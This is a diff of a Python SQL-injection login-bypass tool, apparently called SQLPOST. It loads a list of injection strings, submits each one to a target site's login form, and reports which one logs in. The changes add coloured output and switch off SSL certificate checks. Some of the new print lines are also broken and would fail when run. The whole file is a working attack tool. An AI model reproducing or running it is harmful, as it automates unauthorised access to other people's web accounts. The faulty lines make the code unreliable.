@@ -7,22 +7,30 @@ import argparse
 import mechanize
 import ssl
 import urllib
-import re
+
+W='\033[0m'     
+R='\033[31m'    
+G='\033[0;32m'  
+O='\33[37m'     
+B='\033[34m'    
+P= '\033[35m'   
+Y="\033[1;33m"   
+
+
 class MY_SQL_IN:
      def __init__(self):
-         self.banner ='''
+         self.banner =B+'''
              |________|___________________|_   
              |        |      SQLPOST_     | |    UserName
-             | POST   | | | | | | | | | | | |%%=============-
-             |________|___________________|_|    Password         
-             |        |     @jacstory     |                
-                             
-'''    
+             |'''+O+''' POST '''+R+'''  | | | | | | | | | | | |%%=============-
+             |________|_'''+B+'''__________________|_|    Password         
+             |        |   '''+Y+'''  @jacstory  '''+B+'''   | '''+W    
          print(self.banner)                                 
          self.control()
          self.read_command()
      def read_command(self):
          try: 
+             ssl._create_default_https_context = ssl._create_unverified_context
              list_command  = open(self.args.Code,'r')   
              list_command  = list_command .readlines()                
              for command in list_command :  
@@ -49,7 +57,7 @@ class MY_SQL_IN:
                                     try:
                                       request.select_form(nr = 4)
                                     except Exception :    
-                                        print("[!] NO Form Found HTML  ")
+                                        print("[!] NO Form HTML Login Found  ")
                                         exit()
                  if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                  and not self.args.UserInput and not self.args.PassInput:
@@ -84,6 +92,10 @@ class MY_SQL_IN:
                        request['username']='User'
                        request[f'{self.args.PassForm}']=f'{command}'   
                  elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
+                 and not self.args.UserInput and not self.args.PassInput : 
+                       request[f'{self.args.UserForm}'] =  f'{self.args.user}'
+                       request[f'{self.args.PassForm}']=f'{command}'                       
+                 elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
                  and not self.args.UserInput and  self.args.PassInput :   
                        request[f'{self.args.UserForm}'] =  f'{self.args.user}' 
                        request[f'{self.args.PassForm}'] = f'{command}'                 
@@ -110,7 +122,8 @@ class MY_SQL_IN:
                  elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
                  and self.args.UserInput and self.args.PassInput:
                        request['username']=f'{self.args.user}'
-                       request[f'{self.args.PassForm}']=f'{self.args.password}'        
+                       request[f'{self.args.PassForm}']=f'{self.args.password}'    
+              
                  else:
                      print('[!] Command Not Found')
                      print('[!] Plases see the help options to how to use ')
@@ -122,9 +135,9 @@ class MY_SQL_IN:
                  Get_URL_Content = request.open(passlogin).read()                       
                  if  Get_URL_Content == Get_Oregnal_URL  :
                      
-                     print('\n[*] SLQ Injaction Command    : ', command )
-                     print('[*] Login Page  URL          : ', url )                    
-                     print('[*] Status                   :  NOT LOGIN') 
+                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
+                     print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
+                     print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
                      sys.stdout.write('\x1b[1A')
                      sys.stdout.write('\x1b[2K')  
                      sys.stdout.write('\x1b[1A')
@@ -135,84 +148,88 @@ class MY_SQL_IN:
                      sys.stdout.write('\x1b[2K')
                     
                  else: # print('[+] Username['+'{:<6}'.format(self.args.UserForm) +"] :"+f'{ command}')
-                      print('\n[*] Login URL  : ',  passlogin)
-                      print('[*] SLQ Injaction Successful  Login ')
-                      print('='*30+'\n'+'[!]  Credentials  : - '+'\n'+'='* 20+'\n')
+                      print(B+'[*] '+'Login URL  : '+R,  passlogin)
+                      print(B+'[*] '+'SLQ Injaction Successful  Login ')
+                      print(O+'='*30+'\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n'+W)
                       if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                       and not self.args.UserInput and not self.args.PassInput:
-                          print('[+] username : '+f'{command}')
-                          print('[+] Password : password')
+                          print(B+'[+] '+R+'username : '+Y+f'{command}')
+                          print(B+'[+] '+R+'Password : password')
                       elif self.args.UserForm and not self.args.user and not self.args.PassForm and not self.args.password\
                       and not self.args.UserInput and not self.args.PassInput: 
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm) +"] : "+f'{ command}')
-                           print('[+] Password           : password')
+                           print(B+'[+] '+R+' username['+P+'{:<6}'.format(self.args.UserForm) +R+"] : "+Y+f'{ command}')
+                           print(B+'[+] '+R+'Password           :'+Y+' password')
                       elif not self.args.UserForm and not self.args.user and  self.args.PassForm and  self.args.password\
                       and not self.args.UserInput and not self.args.PassInput : 
-                           print('[+] username           : '+f'{command}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{self.args.password}')  
+                           print(B+'[+] '+R+'username           : '+P+f'{command}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')  
                       elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
                       and self.args.UserInput and not self.args.PassInput :  
-                           print('[+] username           : '+f'{ command}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+'password')  
+                           print(B+'[+] '+R+'username           : '+Y+f'{ command}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+'password')  
                       elif self.args.UserForm and self.args.PassForm and not self.args.user and not self.args.password\
                       and  self.args.UserInput and not self.args.PassInput:  
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{ command}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+'password') 
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{ command}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+'password') 
                       elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
                       and not self.args.UserInput and not self.args.PassInput: 
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{ command}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{self.args.password}')                             
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{ command}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')                             
                       elif self.args.UserForm and not  self.args.user and not self.args.PassForm and not self.args.password\
                       and not self.args.UserInput and not self.args.PassInput:  
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{ self.args.user}')
-                           print('[+] password['+f'{ command}')   
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{ self.args.user}')
+                           print(B+'[+] '+R+'password['++f'{ command}')   
                       elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
                       and not self.args.UserInput and  self.args.PassInput :
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+']  : User')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')    
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+' User')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')    
                       elif self.args.UserForm and self.args.PassForm and not  self.args.user and not self.args.password\
                       and self.args.PassInput and not self.args.UserInput :  
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : User')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')    
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] :'+Y+' User')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')    
                       elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  self.args.user\
                       and not self.args.UserInput and self.args.PassInput :    
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] :'+f'{self.args.user}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}') 
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)++R'] :'+Y+f'{self.args.user}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}') 
                       elif not self.args.UserForm and not self.args.PassForm and not self.args.password  and not self.args.user\
                       and self.args.UserInput and self.args.PassInput : 
-                           print('[+] username : '+f'{command}')
-                           print('[+] password : '+f'{command}')    
+                           print(B+'[+] '+R+'username : '+Y+f'{command}')
+                           print(B+'[+] '+R+'password : '+Y+f'{command}')   
+                      elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
+                      and not self.args.UserInput and not self.args.PassInput :     
+                            print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
+                            print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')                          
                       elif self.args.UserForm and self.args.PassForm and not self.args.password and not self.args.user\
                       and  self.args.UserInput and self.args.PassInput :     
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{command}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')
                       elif self.args.UserForm and  not self.args.PassForm and not self.args.password  and not self.args.user\
                       and self.args.UserInput and self.args.PassInput:     
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{command}')
-                           print('[+] password           : '+f'{command}')                         
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')
+                           print(B+'[+] '+R+'password           : '+Y+f'{command}')                         
                       elif not self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
                       and self.args.UserInput and self.args.PassInput:     
-                          print('[+] username           : '+f'{command}')
-                          print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')    
+                          print(B+'[+] '+R+'username           : '+Y+f'{command}')
+                          print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')    
                       elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
                       and self.args.UserInput and self.args.PassInput:     
-                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{self.args.user}')
-                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{self.args.password}')                       
+                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')                       
                       exit()
                          
-             print('[!] Web May Not Vulnerable To SQL Injaction ')
-             print('[*] Saugger To Use anther list Command ')  
+             print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
+             print(B+'[*] '+R+'Saugger To Use anther list Command '+W)  
          except urllib.error.URLError:
-                 print("[*] Bad URL Connection refused")
+                 print(B+"[*] "+R+"Bad URL Connection refused"+W)
                  exit()
          except Exception as a :
-                print( "[#] Error : ",a )
+                print( B+"[#] "+R+"Error : "+Y,a+W )
          except KeyboardInterrupt:
               exit()
        
      def control(self):
         
-        #print(B+"")
+        print(B+"")
         parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
         parser.add_argument("-u",'--URL'        , action=None    ,help ="target url loign page") 
         parser.add_argument("-c","--Code"       , action=None    ,help ="the List of SQL Commands") 
@@ -223,7 +240,7 @@ class MY_SQL_IN:
         parser.add_argument("-U","--user"       , action=None    ,help ="use pecifk user name ")
         parser.add_argument("-P","--password"   , action=None    ,help ="use pdcifik Passowrd")       
         self.args = parser.parse_args()  
-#        print(W+"")
+        print(W+"")
         if len(sys.argv)!=1 :
             pass
         else:
